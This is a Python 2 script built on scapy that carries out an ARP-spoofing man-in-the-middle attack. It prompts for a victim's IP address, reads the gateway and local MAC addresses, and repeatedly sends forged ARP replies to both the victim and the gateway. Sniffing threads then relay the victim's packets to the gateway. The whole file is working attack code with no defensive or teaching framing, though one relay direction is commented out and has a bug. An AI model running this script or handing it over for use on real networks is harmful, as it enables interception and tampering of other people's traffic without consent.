#coding: utf-8
import os
import logging
import re
import sys
import signal
import threading
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)	# Delete scapy logging
from scapy.all import *

class arp_poison(threading.Thread):
	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
		threading.Thread.__init__(self)
		self.myMAC = _myMAC
		self.victimMAC = _victimMAC
		self.myIP = _myIP
		self.victimIP = _victimIP
		self.gatewayIP = _gatewayIP
		self.gatewayMAC = _gatewayMAC

	def run(self):
		while(True):
				# Malicious ARP packet send			
			sendp(Ether(dst=self.victimMAC, src=self.myMAC)/ARP(op=ARP.is_at, psrc=self.gatewayIP, pdst=self.victimIP, hwsrc=self.myMAC, hwdst=self.victimMAC), count=3)	
			sendp(Ether(dst=self.gatewayMAC, src=self.myMAC)/ARP(op=ARP.is_at, psrc=self.victimIP, pdst=self.gatewayIP, hwsrc=self.myMAC, hwdst=self.gatewayMAC), count=3)
			time.sleep(2)

class to_gateway(threading.Thread):
	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
		threading.Thread.__init__(self)
		self.myMAC = _myMAC
		self.victimMAC = _victimMAC
		self.myIP = _myIP
		self.victimIP = _victimIP
		self.gatewayIP = _gatewayIP
		self.gatewayMAC = _gatewayMAC
		self.ethlen = len(Ether())
		self.iplen = len(IP())
		self.tcplen = len(TCP())
	
	def run(self):
		while(True):
			sn = sniff(filter="ip and (ether src host " + self.victimMAC + ") and (ether dst host " + self.myMAC + ")", count=1)	
			e = sn[0]
			t = str(e)
			eth = Ether(t[:self.ethlen])
			ip = IP(t[self.ethlen:])
			tcp = TCP(t[self.ethlen+self.iplen:])
	
			pkt = Ether(dst=self.gatewayMAC, src=self.myMAC)/IP(src=self.victimIP, dst=ip.dst)/tcp
			sendp(pkt)

class to_victim(threading.Thread):
	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
		threading.Thread.__init__(self)
		self.myMAC = _myMAC
		self.victimMAC = _victimMAC
		self.myIP = _myIP
		self.victimIP = _victimIP
		self.gatewayIP = _gatewayIP
		self.gatewayMAC = _gatewayMAC
		self.ethlen = len(Ether())
		self.iplen = len(IP())
		self.tcplen = len(TCP())

	def run(self):
		while(True):
			sn2 = sniff(filter="ip and (ether src host " + self.gatewayMAC + ") and (ether dst host " + self.myMAC + ") and (ip dst host " + self.victimIP + ")", count=1)		
			e = sn2[0]
			t = str(e)
			eth = Ether(t[:self.ethlen])
			ip = IP(t[self.ethlen:])
			tcp = TCP(t[self.ethlen+self.iplen:])
	
			pkt = Ether(dst=self.victimMAC, src=self.myMAC)/IP(src=ip.src, dst=victimIP)/tcp
			sendp(pkt)

def main():
	victimIP = raw_input("[*] Please enter the victim's IP >> ")
	ok = re.findall("([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})", victimIP)		# VictimIP validation check
	if not(ok):
		print "Error occured! Invalid IP format."	
		sys.exit(1)

	gatewayIP = os.popen("route | awk '/default/ { print $2 }'").read().replace('\n','')	# GatewayIP parsing
	myIP = os.popen("ifconfig eth0 | awk '/inet addr:/ { print $2 }'").read()[5:].replace('\n','')		# HostIP parsing
	myMAC = os.popen("ifconfig eth0 | awk '/HWaddr/ { print $5 }'").read().replace('\n','')		# HostMAC parsing
	broadcast = 'ff:ff:ff:ff:ff:ff'
	broadcast2 = '00:00:00:00:00:00'
	arp_stat = os.popen("arp -a").read()		# arp table read

	victimMAC = ""
	temp = ""
	ok = re.findall("\("+str(victimIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)	# ARP table MAC address parsing
	gatewayMAC = re.findall("\("+str(gatewayIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)
	
	if gatewayMAC:
		gatewayMAC = gatewayMAC[0]
	else:
		print "Can't get gatewayMAC."
		sys.exit(1)
	
	if ok:
		victimMAC = ok[0]	# If exist

	else:
		try:
			p = sr1(Ether(dst=broadcast, src=myMAC)/ARP(op=ARP.who_has, psrc=myIP, pdst=victimIP, hwsrc=myMAC, hwdst=broadcast2))		# Broadcast ARP packet to victimIP
			temp = p[0].summary()		# get ARP response packet
			ok = re.findall("ARP is at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2})", temp)	# victimMAC parsing
			if ok:
				victimMAC = ok[0]	# victimMAC allocation
		except Exception as e:
			print "Error occured! Can't load the victimMAC. : " + str(e)
			sys.exit(1)

	tArp = arp_poison(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
	tGateway = to_gateway(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
	tVictim = to_victim(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)

	tArp.start()
	tGateway.start()
#	tVictim.start()

	tArp.join()
	tGateway.join()	
#	tVictim.start()
	
if __name__ == '__main__':
	main()
